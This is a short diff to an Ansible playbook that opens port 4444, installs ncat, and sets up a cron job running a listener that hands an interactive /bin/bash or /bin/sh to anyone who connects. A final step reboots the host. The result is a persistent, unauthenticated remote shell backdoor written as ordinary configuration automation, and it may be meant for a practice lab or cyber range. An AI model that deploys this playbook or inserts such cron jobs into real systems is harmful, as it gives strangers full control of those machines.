@@ -8,15 +8,15 @@
     port_no: "4444"
     proto: tcp
 
-- name: Install netcat
+- name: Install ncat
   ansible.builtin.import_playbook: ../common/installPackage.yml
   vars:
-    package: netcat
+    package: ncat
 
 - name: Create netcat listener cron job
   ansible.builtin.import_playbook: ../common/cronJob.yml
   vars:
-    job_cmd: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lnvp 4444 >/tmp/f"
+    job_cmd: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -lnvp 4444 -e /bin/bash >/tmp/f"
 
 - name: Reboot machine
   ansible.builtin.import_playbook: ../common/reboot.yml
